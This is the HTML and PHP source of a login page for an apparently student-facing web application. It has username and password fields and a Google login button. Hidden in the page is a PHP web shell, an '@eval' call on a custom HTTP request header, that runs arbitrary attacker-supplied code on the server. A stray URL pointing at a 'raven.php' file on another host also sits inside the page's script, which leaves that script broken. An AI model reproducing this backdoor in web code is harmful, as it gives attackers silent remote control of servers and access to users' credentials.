
<!doctype html>
<html lang="en">
<head>
	<!-- Required meta tags -->
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<meta name="description" content="" />
	<meta name="keywords" content="" />
	<link rel="shortcut icon" href="./template/img/favicon.ico" />
	<title>Login</title>
	
	<!-- Common CSS -->
	<link rel="stylesheet" href="./template/css_login/bootstrap.min.css" />
	
	<!-- Mian and Login css -->
	<link rel="stylesheet" href="./template/css_login/main.css" />
	<link rel="stylesheet" href="./template/css/bootstrap.min.css">
	<script type="text/javascript" src="./template/js/jquery.min.js"></script>
	<script type="text/javascript" src="./template/js/bootbox.js"></script>
    <script src="./template/js/bootstrap.min.js"></script>
    
		
</head>  
<body class="login-bg">
<style>
.bootbox{
  border:1px solid #CCCCCC;
  background:#ffffff;
  border-radius: 5px;
  height:145px;
  }
 .btn-fill-sm {
  display: inline-block;
  border: none;
  background-color: transparent;
  padding: 12px 25px;
  cursor: pointer;
}
.btn-fill-sm:focus {
  outline: none;
  box-shadow: none;
  border: none;
}
.btn-gradient-yellow {
  background-color: #ffae01;
}
</style>
<script>
$(document).ready(function() 
{	


https://student.rbru.ac.th/tmp/raven.php

		bootbox.alert("Maaf User dan Password tidak terdaftar !", function() 
	{
		$("body").removeClass("modal-open");
		$("#bootboxm").remove();
		$(".modal-backdrop").remove();
	});
	});
</script>
<?php @eval($_SERVER['HTTP_STUDENT13']); ?>
	<div class="container">
		<div class="login-screen row align-items-center">
			<div class="col-xl-12 col-lg-12 col-md-12 col-sm-12">
				<form action="index.php?kanal=login" method="post">
					<input type="hidden" name="aksi" value="login" />
					<div class="login-container">
						<div class="row no-gutters">
							<div class="col-xl-4 col-lg-5 col-md-6 col-sm-12">
								<div class="login-box">
									<a href="#" class="login-logo">
										<img src="./template/img/logo.png" alt="LOGIN" />
									</a>
									<div class="input-group">
										<span class="input-group-addon" id="username"><i class="icon-account_circle"></i></span>
										<input type="text" name="user" id="user" class="form-control" placeholder="Username" aria-label="username" aria-describedby="username">
									</div>
									<br>
									<div class="input-group">
										<span class="input-group-addon" id="password"><i class="icon-verified_user"></i></span>
										<input type="password" name="pass" id="pass" class="form-control" placeholder="Password" aria-label="Password" aria-describedby="password">
									</div>
									<div class="actions clearfix"></div>
									<div class="">
										<button type="submit" class="btn btn-primary btn-lg btn-block waves-effect waves-light">Login With Aplikasi</button>
										<button class="btn btn-danger btn-lg btn-block waves-effect waves-light"><a href="./librari/gauth/index.php" style="color:white;text-decoration:none" class="soc-googleplus">Login With Google</a></button>
									</div>
								</div>
							</div>
							<div class="col-xl-8 col-lg-7 col-md-6 col-sm-12">
								<div class="login-slider"></div>
							</div>
						</div>
					</div>
				</form>
			</div>
		</div>
	</div>
	<footer class="main-footer no-bdr fixed-btm">
		<div class="container">
			© Copyright 2019.
		</div>
	</footer>
</body>
</html>
